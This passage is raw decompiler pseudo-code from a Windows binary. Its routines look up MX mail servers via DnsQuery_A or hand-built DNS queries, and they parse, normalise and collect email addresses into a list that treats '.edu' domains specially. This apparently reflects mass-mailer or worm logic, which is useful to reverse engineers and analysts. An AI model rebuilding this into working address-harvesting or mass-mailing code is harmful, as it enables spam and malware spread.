        004a4fea: edi = *L004a1148();
        004a4fee: A24 = edi;
        004a4ff2: if(edi != ebp && edi != -1) {
            004a5001: for(A14 = ebp; 1; ebp = 0) {
                004a5011: A18 = ebp;
                004a5015: if(A14 != ebp) {
                    004a501e: (save)ebp;
                } else {
                    004a5017: (save)256;
                }
                004a503f: if(L004A5241(edi, A144, A144, *L004a114c()) == 0) {
                    004a5045: (save)12;
                    004a504b: (restore)esi;
                    004a504c: A38 = edi;
                    004a5050: (save) & A30;
                    004a5051: (save)ebp;
                    004a5056: (save)ebp;
                    004a5057: (save) & A3c;
                    004a5058: (save)ebp;
                    004a5059: A48 = 1;
                    004a5061: A40 = esi;
                    004a5065: A44 = ebp;
                    004a5071: if(*L004a1144() > 0) {
                        004a507b: memset(ebx, ebp, 4);
                        004a5083: (save)ebp;
                        004a5084: (save)4096;
                        004a5089: (save)ebx;
                        004a508a: (save)edi;
                        004a508b: eax = *L004a1154();
                        004a5091: ebp = eax;
                        004a5095: A28 = ebp;
                        004a5099: if(ebp > 0 && ebp > esi) {
                            004a50a7: ax = *(ebx + 2);
                            004a50ab: edi = *L004A1158;
                            004a50b1: (save)eax;
                            004a50b7: esi = *edi() & 15;
                            004a50bd: if(esi == 3) {
                                ff1001a5: goto L004a51f4;
                            }
                            004a50c6: if(esi == 2) {
                                004a50cc: (save) *(ebx + 2);
                                004a50cd: *edi();
                                004a50d1: if(al & 128) {
                                    ff1001a9: goto L004a51f4;
                                }
                            }
                            004a50d9: if(esi == 0) {
                                004a50df: (save)ebp;
                                004a50e1: eax = L004A5414(ebx);
                                004a50e7: A24 = eax;
                                004a50ed: (restore)ecx;
                                004a50ee: if(eax != 0) {
                                    004a50f4: A1c = A1c & esi;
                                    004a50f8: A18 = A18 & esi;
                                    004a50fc: edi = eax;
                                    004a50fe: for(A10 = edi; 1; edi = A10) {
                                        004a5110: if(*(edi + 266) == 1 && *(edi + 264) == 15 && *(edi + 268) >= 3) {
                                            004a5132: ebp = 264;
                                            004a5137: (save)264;
                                            004a5138: (save)0;
                                            004a5140: (save) *__imp__GetProcessHeap();
                                            004a5147: esi = *__imp__HeapAlloc();
                                            004a514b: if(esi == 0) {
                                                ff1001b5: break;
                                            }
                                            004a5155: memset(esi, 0, ebp);
                                            004a515a: eax = *(edi + 272);
                                            004a5160: edi = edi + 272;
                                            004a516d: (save) *(eax + ebx);
                                            004a516e: *L004a1158();
                                            004a5177: *(esi + 4) = ax & 65535;
                                            004a517a: eax = *edi;
                                            004a517c: ebp = esi + 8;
                                            004a5188: L004A5351(ebx, eax + 1 + 1, A2c, ebp);
                                            004a5194: if(*ebp != 0) {
                                                004a51a8: eax = A1c;
                                                004a51ae: if(eax != 0) {
                                                    004a51ba: *eax = esi;
                                                    004a51bc: A1c = esi;
                                                } else {
                                                    004a51b0: A1c = esi;
                                                    004a51b4: A18 = esi;
                                                }
                                            } else {
                                                004a5196: (save)esi;
                                                004a5197: (save)0;
                                                004a519f: (save) *__imp__GetProcessHeap();
                                                004a51a0: *__imp__HeapFree();
                                            }
                                            004a51c0: edi = A10;
                                        }
                                        004a51c4: edi = *edi;
                                        004a51c8: A10 = edi;
                                        004a51cc: if(edi == 0) {
                                            ff1001bc: break;
                                        }
                                    }
                                    004a51d7: (save)A20;
                                    004a51db: if(A18 != 0) {
                                        ff1001bd: goto L004a5203;
                                    }
                                    004a51dd: L004A53F1();
                                    004a51e2: (restore)ecx;
                                }
                            }
                        }
                    }
                }
                004a51e3: A14 = A14 + 1;
                004a51ec: if(A14 >= 2) {
                    ff1001c0: break;
                }
                004a5007: edi = A24;
            }
            004a51f2: goto L004a5209;
004a51f4: L004a51f4:
            004a51fb: *A144 = 2;
            004a5201: goto L004a5209;
004a5203: L004a5203:
            004a5203: L004A53F1();
            004a5208: (restore)ecx;
004a5209: L004a5209:
            004a5209: (save)ebx;
            004a520a: (save)0;
            004a5212: (save) *__imp__GetProcessHeap();
            004a5213: *__imp__HeapFree();
            004a5219: (save)A24;
            004a521d: *L004a115c();
            004a5223: eax = A18;
            004a5227: goto L004a5236;
        }
        004a5229: (save)ebx;
        004a522a: (save)ebp;
        004a522d: (save) *esi();
        004a522e: *__imp__HeapFree();
    }
    004a5234: eax = 0;
004a5236: L004a5236:
    004a5236: (restore)edi;
    004a5237: (restore)esi;
    004a5238: (restore)ebp;
    004a5239: (restore)ebx;
    004a523a: esp = esp + 296;
}

/*	Procedure: 0x004A5241 - 0x004A52F9
 *	Argument size: 16
 *	Local size: 1024
 *	Save regs size: 8
 */

L004A5241(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffc00;
	/* unknown */ void  Vfffffc02;
	/* unknown */ void  Vfffffc04;
	/* unknown */ void  Vfffffc06;
	/* unknown */ void  Vfffffc08;
	/* unknown */ void  Vfffffc0a;
	/* unknown */ void  Vfffffc0c;



    004a524c: (save)edi;
    004a524d: ebx = 0;
    004a525c: memset( & Vfffffc00, 0, 1024);
    004a5264: *__imp__GetTickCount();
    004a526a: edi = *L004A114C;
    004a5270: Vfffffc00 = ax;
    004a527b: (save)1;
    004a527d: Vfffffc02 = A14;
    004a5284: *edi();
    004a5286: Vfffffc04 = ax;
    004a5293: (save) & Vfffffc0c;
    004a5294: Vfffffc06 = bx;
    004a529e: Vfffffc08 = bx;
    004a52a5: Vfffffc0a = bx;
    004a52b4: (restore)ecx;
    004a52b5: esi = L004A52FA(A10) + 12;
    004a52b8: (save)15;
    004a52ba: *edi();
    004a52bc: *(ebp + esi + -1024) = ax;
    004a52c7: esi = esi + 1 + 1;
    004a52c8: *edi();
    004a52cc: *(ebp + esi + -1024) = ax;
    004a52d7: esi = esi + 2;
    004a52e6: eax = *L004a1170(A8, & Vfffffc00, esi, ebx, Ac, 16, 1);
    004a52ec: ecx = 0;
    004a52ee: (restore)edi;
    004a52ef: eax :: 0;
    004a52f1: asm("setng cl");
    004a52f9: return(ecx);
}

/*	Procedure: 0x004A52FA - 0x004A5350
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004A52FA(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    004a52fe: (save)esi;
    004a52ff: eax = 0;
    004a5301: esi = 0;
    004a5306: (save)A8;
    004a530b: if(*A4 != 0) {
        004a530d: (save)ebx;
        004a530e: do {
            004a530e: bl = *(eax + A4);
            004a5311: for(edx = eax; bl != 0 && bl != 46; edx = edx + 1) {
                004a531c: bl = *(edx + A4 + 1);
            }
            004a5327: *(esi + A8) = dl - al;
            004a532a: for(esi = esi + 1; eax < edx; eax = eax + 1) {
                004a5332: *(esi + A8) = *(eax + A4);
                004a5335: esi = esi + 1;
            }
            004a533d: if(*(eax + A4) == 46) {
                004a533f: eax = eax + 1;
            }
        } while(*(eax + A4) != 0);
        004a5346: (restore)ebx;
    }
    004a5347: *(esi + A8) = 0;
    004a534b: eax = esi + 1;
    004a534e: (restore)A8;
    004a534f: (restore)esi;
}

/*	Procedure: 0x004A5351 - 0x004A53F0
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L004A5351(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    004a5354: (save)ecx;
    004a5355: eax = Ac;
    004a5358: *(ebp - 4) = 0;
    004a535c: (save)esi;
    004a535d: (save)edi;
    004a535e: edi = A14;
    004a5361: A14 = 0;
    004a5365: esi = 0;
    004a5367: *edi = 0;
    004a536d: if(eax < A10) {
        004a536f: (save)A8;
        004a5373: do {
            004a5379: if(esi >= 255) {
                ff1001cf: break;
            }
            004a537b: edx = *(A8 + eax) & 255;
            004a537f: ecx = A8 + eax;
            004a5384: if(edx == 0) {
                ff1001d1: goto L004a53d0;
            }
            004a5389: if(edx >= 64) {
                004a53a6: if(A14 == 0) {
                    004a53a8: eax = eax + 2;
                    004a53ab: *(ebp - 4) = eax;
                }
                004a53b1: A14 = 1;
                004a53bf: eax = *L004a1158( *ecx) & 16383;
                004a53c7: if(eax >= A10) {
                    ff1001db: break;
                } else {
                    ff1001dc: continue;
                }
            }
            004a538b: eax = eax + 1;
            004a538e: if(edx > 0) {
                004a5390: do {
                    004a5393: *(esi + edi) = *(A8 + eax);
                    004a5396: esi = esi + 1;
                    004a5397: eax = eax + 1;
                } while(edx = edx - 1);
            }
            004a539b: *(esi + edi) = 46;
            004a539f: esi = esi + 1;
        } while(eax < A10);
        004a53ce: goto L004a53d1;
004a53d0: L004a53d0:
        004a53d0: eax = eax + 1;
004a53d1: L004a53d1:
        004a53d1: for((restore)A8; esi > 0 && *(edi + esi - 1) == 46; esi = esi - 1) {
        }
    }
    004a53e0: *(esi + edi) = 0;
    004a53e8: (restore)edi;
    004a53e9: (restore)esi;
    004a53ea: if(A14 != 0) {
        004a53ec: eax = *(ebp - 4);
    }
}

/* DEST BLOCK NOT FOUND: 004a53f7 -> 004a5413 */
stack space not deallocated on return
/*	Procedure: 0x004A53F1 - 0x004A5413
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A53F1(A4)
/* unknown */ void  A4;
{



    004a53f7: if(A4 != 0) {
        004a53f9: (save)esi;
        004a53fa: do {
            004a53fa: esi = *eax;
            004a5406: *__imp__HeapFree( *__imp__GetProcessHeap(), 0, eax);
            004a540e: eax = esi;
        } while(esi != 0);
        004a5412: (restore)esi;
    }
}

/*	Procedure: 0x004A5414 - 0x004A5555
 *	Argument size: 8
 *	Local size: 296
 *	Save regs size: 12
 */

L004A5414(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffed8;
	/* unknown */ void  Vfffffedc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe2;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a5420: edi = 0;
    004a5426: Vfffffffc = 0;
    004a5429: Vfffffff4 = 0;
    004a542c: if(Ac >= 12) {
        004a542e: esi = A8;
        004a543d: ebx = L004A5556(esi, 12, Ac, esi);
        004a5445: if(ebx < Ac) {
            ff1001eb: goto L004a544e;
        }
    }
    004a5447: eax = 0;
    004a5449: goto L004a5551;
004a544e: L004a544e:
    004a544e: eax = *(esi + 10) & 65535;
    004a5456: eax = eax + ( *(esi + 8) & 65535);
    004a5458: Vfffffff8 = edi;
    004a545f: eax = eax + ( *(esi + 6) & 65535);
    004a5463: Vfffffff0 = eax;
    004a5466: if(eax > edi) {
        004a5471: while(ebx < Ac) {
            004a547a: (save)276;
            004a5485: (save)0;
            004a5487: (save) & Vfffffed8;
            004a5488: memset();
            004a549e: ebx = L004A5351(esi, ebx, Ac, & Vfffffedc);
            004a54a3: eax = ebx + 10;
            004a54a9: if(eax >= Ac) {
                ff1001f1: break;
            }
            004a54af: ax = *(ebx + esi);
            004a54b3: edi = *L004A1158;
            004a54b9: (save)eax;
            004a54ba: eax = *edi();
            004a54bd: Vffffffe0 = ax;
            004a54c1: ebx = ebx + 1 + 1;
            004a54c6: (save) *(ebx + esi);
            004a54c7: eax = *edi();
            004a54c9: ebx = ebx + 6;
            004a54cc: Vffffffe2 = ax;
            004a54d4: (save) *(ebx + esi);
            004a54d5: *edi();
            004a54d7: Vffffffe4 = ax;
            004a54db: ebx = ebx + 1;
            004a54dc: eax = ax & 65535;
            004a54df: ebx = ebx + 1;
            004a54e2: Vffffffe8 = ebx;
            004a54e8: if(eax + ebx > Ac) {
                ff1001f3: break;
            }
            004a54ea: esi = 292;
            004a54ef: (save)292;
            004a54f0: (save)0;
            004a54f8: (save) *__imp__GetProcessHeap();
            004a54ff: edi = *__imp__HeapAlloc();
            004a5503: Vffffffec = edi;
            004a5506: if(edi == 0) {
                ff1001f5: break;
            }
            004a550c: memset(edi, 0, esi);
            004a5514: esi = & Vfffffed8;
            004a551c: ecx = 69;
            004a551d: asm("rep movsd");
            004a5523: ecx = Vfffffffc;
            004a5526: ebx = ebx + (Vffffffe4 & 65535);
            004a5528: eax = Vffffffec;
            004a552b: *eax = 0;
            004a5530: if(ecx != 0) {
                004a553a: *ecx = eax;
                004a553c: Vfffffffc = eax;
            } else {
                004a5532: Vfffffffc = eax;
                004a5535: Vfffffff4 = eax;
            }
            004a553f: Vfffffff8 = Vfffffff8 + 1;
            004a5548: if(Vfffffff8 >= Vfffffff0) {
                ff1001fa: break;
            }
            004a546e: esi = A8;
        }
    }
    004a554e: eax = Vfffffff4;
004a5551: L004a5551:
}

/*	Procedure: 0x004A5556 - 0x004A55B4
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L004A5556(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    004a5559: (save)ecx;
    004a555a: *(ebp - 4) = 0;
    004a555e: (save)A14;
    004a5562: (save)esi;
    004a5563: (save)edi;
    004a5564: edi = *L004A1158;
    004a556e: (save) *(A14 + 4);
    004a556f: *edi();
    004a5571: esi = Ac;
    004a5577: if(ax > 0) {
        004a5579: do {
            004a557c: if(esi >= A10) {
                ff1001fd: break;
            }
            004a5581: eax = *(A8 + esi) & 255;
            004a5587: if(eax != 0) {
                004a5591: if(eax >= 64) {
                    004a5599: esi = esi + 6;
                    004a559b: goto L004a559c;
                }
                004a5593: esi = esi + eax + 1;
            } else {
                004a5589: esi = esi + 5;
004a559c: L004a559c:
                004a559c: *(ebp - 4) = *(ebp - 4) + 1;
            }
            004a55a4: *edi( *(A14 + 4));
        } while(*(ebp - 4) < (ax & 65535));
    }
    004a55ae: eax = esi;
    004a55b0: (restore)edi;
    004a55b1: (restore)esi;
    004a55b2: (restore)A14;
}

/* DEST BLOCK NOT FOUND: 004a55c1 -> 004a55cd */
/*	Procedure: 0x004A55B5 - 0x004A55CD
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A55B5(A4)
/* unknown */ void  A4;
{



    004a55c1: if(L004A55CE(A4) == 0) {
        004a55c7: eax = L004A569F(A4);
    }
}

/*	Procedure: 0x004A55CE - 0x004A569E
 *	Argument size: 4
 *	Local size: 20
 *	Save regs size: 8
 */

L004A55CE(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a55d6: esi = "dnsapi.dll";
    004a55db: edi = & Vffffffec;
    004a55de: *edi = *esi;
    004a55de: edi = edi + 4;
    004a55de: esi = esi + 4;
    004a55df: *edi = *esi;
    004a55df: edi = edi + 4;
    004a55df: esi = esi + 4;
    004a55e0: *edi = *esi;
    004a55e0: edi = edi + 4;
    004a55e0: esi = esi + 4;
    004a55e5: (save) & Vffffffec;
    004a55e6: *edi = *esi;
    004a55e6: edi = edi + 1;
    004a55e6: esi = esi + 1;
    004a55e7: eax = *__imp__GetModuleHandleA();
    004a55ed: esi = 0;
    004a55f1: if(eax == 0) {
        004a55f6: (save) & Vffffffec;
        004a55f7: eax = *__imp__LoadLibraryA();
        004a55ff: if(eax == esi) {
            ff100209: goto L004a5623;
        }
    }
    004a5601: (save)"DnsQuery_A";
    004a5606: (save)eax;
    004a5607: eax = *__imp__GetProcAddress();
    004a560f: if(eax != esi) {
        004a5614: (save)esi;
        004a5615: (save) & Vfffffff8;
        004a5616: (save)esi;
        004a5617: (save)esi;
        004a5618: (save)15;
        004a561a: (save)A8;
        004a5621: if(*eax() == 0) {
            ff10020d: goto L004a5627;
        }
    }
004a5623: L004a5623:
    004a5623: eax = 0;
    004a5625: goto L004a569b;
004a5627: L004a5627:
    004a5627: edi = Vfffffff8;
    004a562a: (save)ebx;
    004a562d: A8 = esi;
    004a5630: Vfffffffc = esi;
    004a5633: if(edi != esi) {
        004a5635: ebx = 264;
        004a563a: do {
            004a563f: if(*(edi + 8) == 15) {
                004a5641: (save)ebx;
                004a5642: (save)esi;
                004a5649: (save) *__imp__GetProcessHeap();
                004a5650: esi = *__imp__HeapAlloc();
                004a5654: if(esi == 0) {
                    ff100213: break;
                }
                004a565a: memset(esi, 0, ebx);
                004a5666: *(esi + 4) = *(edi + 28) & 65535;
                004a5675: *__imp__lstrcpynA(esi + 8, *(edi + 24), 255);
                004a567b: eax = A8;
                004a5680: if(eax != 0) {
                    004a568a: *eax = esi;
                    004a568c: A8 = esi;
                } else {
                    004a5682: A8 = esi;
                    004a5685: Vfffffffc = esi;
                }
            }
            004a568f: edi = *edi;
            004a5691: esi = 0;
        } while(edi != 0);
    }
    004a5697: eax = Vfffffffc;
    004a569a: (restore)ebx;
004a569b: L004a569b:
}

/*	Procedure: 0x004A569F - 0x004A57A3
 *	Argument size: 4
 *	Local size: 28
 *	Save regs size: 8
 */

L004A569F(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe6;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a56a7: esi = "iphlpapi.dll";
    004a56ac: (save)edi;
    004a56ad: (save)esi;
    004a56ae: eax = *__imp__GetModuleHandleA();
    004a56b6: if(eax == 0 || eax == -1) {
        004a56bd: (save)esi;
        004a56be: eax = *__imp__LoadLibraryA();
    }
    004a56c6: if(eax != 0) {
        004a56cf: if(eax == -1) {
            ff10021f: goto L004a579d;
        }
        004a56d5: (save)"GetNetworkParams";
        004a56da: (save)eax;
        004a56e1: edi = *__imp__GetProcAddress();
        004a56e5: if(edi == 0) {
            ff100221: goto L004a579d;
        }
        004a56eb: ebx = __imp__GetProcessHeap;
        004a56f1: esi = 16384;
        004a56f6: (save)16384;
        004a56f7: (save)0;
        004a56fb: (save) *__imp__GetProcessHeap();
        004a56fc: eax = *__imp__HeapAlloc();
        004a5705: Vfffffffc = eax;
        004a5708: (save) & Vfffffff4;
        004a5709: (save)Vfffffffc;
        004a570a: Vfffffff4 = esi;
        004a570d: eax = *edi();
        004a5711: if(eax != 0) {
            ff100223: goto L004a579d;
        }
        004a5717: Vfffffff8 = Vfffffff8 & eax;
        004a571d: for(edi = Vfffffffc + 268; edi != 0; edi = *edi) {
            004a5727: esi = edi + 4;
            004a572c: if(esi != 0) {
                004a572e: (save)53;
                004a5730: Vffffffe4 = 2;
                004a5736: *L004a114c();
                004a573c: (save)esi;
                004a573d: Vffffffe6 = ax;
                004a5741: eax = *L004a1174();
                004a5749: Vffffffe8 = eax;
                004a574c: if(eax != 0 && eax != -1) {
                    ff10022b: goto L004a5768;
                }
                004a5753: (save)esi;
                004a5754: eax = *L004a1178();
                004a575c: if(eax != 0) {
                    004a5763: eax = *( *( *(eax + 12)));
                    004a5765: Vffffffe8 = eax;
004a5768: L004a5768:
                    004a576a: if(eax != 0 && eax != -1) {
                        004a5771: (save)A8;
                        004a5778: eax = L004A4F73( & Vffffffe4);
                        004a577e: Vfffffff8 = eax;
                        004a5783: (restore)ecx;
                        004a5784: if(Vfffffff8 != 0) {
                            ff100233: break;
                        }
                    }
                }
            }
        }
        004a5792: *__imp__HeapFree( *ebx(), 0, Vfffffffc);
        004a5798: eax = Vfffffff8;
    } else {
004a579d: L004a579d:
        004a579d: eax = 0;
    }
    004a579f: (restore)edi;
}

/* DEST BLOCK NOT FOUND: 004a57aa -> 004a57c6 */
stack space not deallocated on return
/*	Procedure: 0x004A57A4 - 0x004A57C6
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A57A4(A4)
/* unknown */ void  A4;
{



    004a57aa: if(A4 != 0) {
        004a57ac: (save)esi;
        004a57ad: do {
            004a57ad: esi = *eax;
            004a57b9: *__imp__HeapFree( *__imp__GetProcessHeap(), 0, eax);
            004a57c1: eax = esi;
        } while(esi != 0);
        004a57c5: (restore)esi;
    }
}

/*	Procedure: 0x004A57C7 - 0x004A589E
 *	Argument size: 8
 *	Local size: 256
 *	Save regs size: 8
 */

L004A57C7(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff00;



    004a57d2: (save)A8;
    004a57d5: edi = __imp__lstrlenA;
    004a57e2: if(*__imp__lstrlenA() <= 128) {
        004a57ea: (save) & Vffffff00;
        004a57f6: (restore)ecx;
        004a57f7: if(L004A589F(A8) == 0) {
            004a57f9: for(esi = *L004A8D14; 1; esi = *esi) {
                004a5807: (save) & Vffffff00;
                004a5808: if(esi == 0) {
                    ff10023d: goto L004a5820;
                }
                004a580d: (save)esi + 10;
                004a5816: if(*__imp__lstrcmpiA() == 0) {
                    ff10023f: break;
                }
            }
            004a581c: (save)2;
            004a581e: goto L004a583f;
004a5820: L004a5820:
            004a5824: edi = *edi() + 15;
            004a5827: (save)edi;
            004a5828: (save)0;
            004a5830: (save) *__imp__GetProcessHeap();
            004a5837: esi = *__imp__HeapAlloc();
            004a583b: if(esi != 0) {
                ff100241: goto L004a5842;
            }
        }
    }
    004a583d: (save)1;
004a583f: L004a583f:
    004a583f: (restore)eax;
    004a5840: goto L004a589b;
004a5842: L004a5842:
    004a5846: memset(esi, 0, edi);
    004a584b: *(esi + 8) = 0;
    004a5858: *(esi + 4) = *__imp__GetTickCount();
    004a585e: *(esi + 9) = Ac;
    004a5867: (save) & Vffffff00;
    004a586b: (save)esi + 10;
    004a586c: *__imp__lstrcpyA();
    004a5877: *esi = *L004A8D14;
    004a5879: *L004A8D14 = esi;
    004a5885: (save)".edu";
    004a5893: (restore)ecx;
    004a5894: if(L004A48E9( & Vffffff00) != 0) {
        004a5896: *(esi + 9) = *(esi + 9) + 1;
    }
    004a5899: eax = 0;
004a589b: L004a589b:
}

/*	Procedure: 0x004A589F - 0x004A5914
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 4
 */

L004A589F(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;



    004a58a3: esi = Ac;
    004a58a6: (save)esi;
    004a58b2: (restore)ecx;
    004a58b3: if(L004A5915(A8) != 0) {
004a58b5: L004a58b5:
        004a58b7: eax = 1;
    } else {
        004a58ba: while(*esi != 0) {
            004a58c0: eax = L004A5C6E(esi);
            004a58c8: Ac = eax;
            004a58cb: if(eax == 0) {
                ff100249: goto L004a58fa;
            }
            004a58cd: (save)esi;
            004a58ce: eax = *__imp__lstrlenA();
            004a58d4: do {
                004a58d5: if(eax = eax - 1) {
                    ff10024b: break;
                }
                004a58d7: cl = *(eax + esi);
            } while(cl != 64 && cl != 46);
            004a58e6: if(eax <= 0) {
                ff100251: break;
            }
            004a58e8: eax = eax + esi;
            004a58ed: if(*eax != 46) {
                ff100253: break;
            }
            004a58ef: *eax = 0;
        }
        004a58f8: if(Ac != 0) {
            ff100255: goto L004a58b5;
        }
004a58fa: L004a58fa:
        004a5903: if(L004A5ECC(esi) != 0) {
            ff100257: goto L004a58b5;
        }
        004a590b: eax = ~(L004A5F8C(esi));
        004a590d: asm("sbb eax,eax");
        004a5910: eax = ~eax;
    }
}

stack space not deallocated on return
/*	Procedure: 0x004A5915 - 0x004A5C6D
 *	Argument size: 20
 *	Local size: 0
 *	Save regs size: 4
 */

L004A5915(Ac, A18, A1c)
/* unknown */ void  Ac;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;



    004a5916: ebx = Ac;
    004a591a: (save)ebp;
    004a591b: (save)esi;
    004a591c: (save)edi;
    004a591d: (save)ebx;
    004a591e: eax = *__imp__lstrlenA();
    004a5927: if(eax >= 3) {
        004a592d: ebp = 0;
        004a5932: if(*ebx != 0) {
            004a5938: do {
                004a5940: if(*__imp____mb_cur_max <= 1) {
                    004a5959: eax = *(ebx + ebp);
                    004a5962: eax = *( *__imp___pctype + eax * 2) & 8;
                } else {
                    004a5949: eax = *__imp___isctype( *(ebx + ebp), 8);
                }
                004a5967: if(eax == 0) {
                    004a5971: if(*__imp____mb_cur_max <= 1) {
                        004a598d: eax = *(ebx + ebp);
                        004a5997: eax = *( *__imp___pctype + eax * 2) & 263;
                    } else {
                        004a597d: eax = *__imp___isctype( *(ebx + ebp), 263);
                    }
                    004a599e: if(eax != 0) {
                        ff100263: break;
                    }
                    004a59a3: (save) *(ebx + ebp);
                    004a59a9: eax = L004A491B("-._!@");
                    004a59b1: (restore)ecx;
                    004a59b2: if(eax != 0) {
                        ff100265: break;
                    }
                }
                004a59b4: ebp = ebp + 1;
            } while(*(ebx + ebp) != 0);
        }
        004a59bf: while(*(ebx + ebp) != 0) {
            004a59c6: (save)eax;
            004a59cc: eax = L004A491B("-._!");
            004a59d4: (restore)ecx;
            004a59d5: if(eax == 0) {
                ff10026b: break;
            }
            004a59d7: ebp = ebp + 1;
        }
        004a59da: al = *(ebx + ebp);
        004a59dd: esi = A1c;
        004a59e1: edi = 0;
        004a59e5: A18 = 0;
        004a59e9: do {
            004a59ed: if(al == 64) {
                ff10026f: break;
            }
            004a59f8: if(*__imp____mb_cur_max <= 1) {
                004a5a13: eax = al;
                004a5a1c: eax = *( *__imp___pctype + eax * 2) & 263;
            } else {
                004a5a03: eax = *__imp___isctype(al, 263);
            }
            004a5a23: if(eax == 0) {
                004a5a28: (save) *(ebx + ebp);
                004a5a36: (restore)ecx;
                004a5a37: if(L004A491B("-._!@") == 0) {
                    ff100275: goto L004a5a4d;
                }
            }
            004a5a3e: *__imp__tolower( *(ebx + ebp));
            004a5a44: *(edi + esi) = al;
            004a5a47: edi = edi + 1;
            004a5a49: A18 = edi;
004a5a4d: L004a5a4d:
            004a5a4d: al = *(ebx + ebp + 1);
            004a5a51: ebp = ebp + 1;
        } while(al != 0);
        004a5a5a: if(*(ebx + ebp) != 64) {
            ff100279: goto L004a5c66;
        }
        004a5a60: do {
            004a5a60: ebp = ebp + 1;
        } while(*(ebx + ebp) == 64);
        004a5a67: *(edi + esi) = 0;
        004a5a6b: (save)esi;
        004a5a73: A1c = eax;
        004a5a77: if(!(eax = *__imp__lstrlenA() - 1)) {
            004a5a7d: do {
                004a5a83: edi = eax + esi;
                004a5a89: if(*__imp____mb_cur_max <= 1) {
                    004a5aa1: eax = *edi;
                    004a5aa9: eax = *( *__imp___pctype + eax * 2) & 8;
                } else {
                    004a5a91: eax = *__imp___isctype( *edi, 8);
                }
                004a5aae: if(eax == 0) {
                    004a5ab2: (save) *edi;
                    004a5ac0: (restore)ecx;
                    004a5ac1: if(L004A491B("-._!") == 0) {
                        004a5acb: if(*__imp____mb_cur_max <= 1) {
                            004a5ae6: eax = *edi;
                            004a5aef: eax = *( *__imp___pctype + eax * 2) & 263;
                        } else {
                            004a5ad6: eax = *__imp___isctype( *edi, 263);
                        }
                        004a5af6: if(eax != 0) {
                            ff100287: goto L004a5b0b;
                        }
                        004a5afa: (save) *edi;
                        004a5b08: (restore)ecx;
                        004a5b09: if(L004A491B("-._!@") != 0) {
004a5b0b: L004a5b0b:
                            004a5b0e: if(*edi != 64) {
                                ff10028b: break;
                            }
                        }
                    }
                }
                004a5b15: A1c = eax;
            } while(eax = A1c - 1);
            004a5b1f: edi = A18;
        }
        004a5b27: *(A1c + esi + 1) = 0;
        004a5b2c: *(edi + esi) = 64;
        004a5b30: edi = edi + 1;
        004a5b31: for(ebx = ebx + ebp; *ebx != 0; ebx = ebx + 1) {
            004a5b40: if(*__imp____mb_cur_max <= 1) {
                004a5b5b: eax = *ebx;
                004a5b64: eax = *( *__imp___pctype + eax * 2) & 263;
            } else {
                004a5b4b: eax = *__imp___isctype( *ebx, 263);
            }
            004a5b6b: if(eax == 0) {
                004a5b6f: (save) *ebx;
                004a5b7d: (restore)ecx;
                004a5b7e: if(L004A491B("-._!@") == 0) {
                    ff100295: goto L004a5b9b;
                }
            }
            004a5b85: if(*(edi + esi - 1) != 46 || *ebx != 46) {
                004a5b90: *__imp__tolower( *ebx);
                004a5b96: *(edi + esi) = al;
                004a5b9a: edi = edi + 1;
            }
004a5b9b: L004a5b9b:
        }
        004a5b9e: *(edi + esi) = 0;
        004a5ba2: (save)esi;
        004a5ba9: ebx = *__imp__lstrlenA();
004a5bab: L004a5bab:
        004a5bab: do {
            004a5bac: if(ebx = ebx - 1) {
                ff10029b: break;
            }
            004a5bb7: edi = ebx + esi;
            004a5bbd: if(*__imp____mb_cur_max <= 1) {
                004a5bd5: eax = *edi;
                004a5bdd: eax = *( *__imp___pctype + eax * 2) & 8;
            } else {
                004a5bc5: eax = *__imp___isctype( *edi, 8);
            }
            004a5be2: if(eax != 0) {
                ff10029f: goto L004a5bab;
            }
            004a5be6: (save) *edi;
            004a5bf4: (restore)ecx;
            004a5bf5: if(L004A491B("-._!") != 0) {
                ff1002a1: goto L004a5bab;
            }
            004a5bff: if(*__imp____mb_cur_max <= 1) {
                004a5c1a: eax = *edi;
                004a5c23: eax = *( *__imp___pctype + eax * 2) & 263;
            } else {
                004a5c0a: eax = *__imp___isctype( *edi, 263);
            }
            004a5c2a: if(eax == 0) {
                004a5c2e: (save) *edi;
                004a5c3c: (restore)ecx;
                004a5c3d: if(L004A491B("-._!@") == 0) {
                    ff1002a7: goto L004a5bab;
                }
            }
        } while(*edi == 64);
        004a5c4c: *(ebx + esi + 1) = 0;
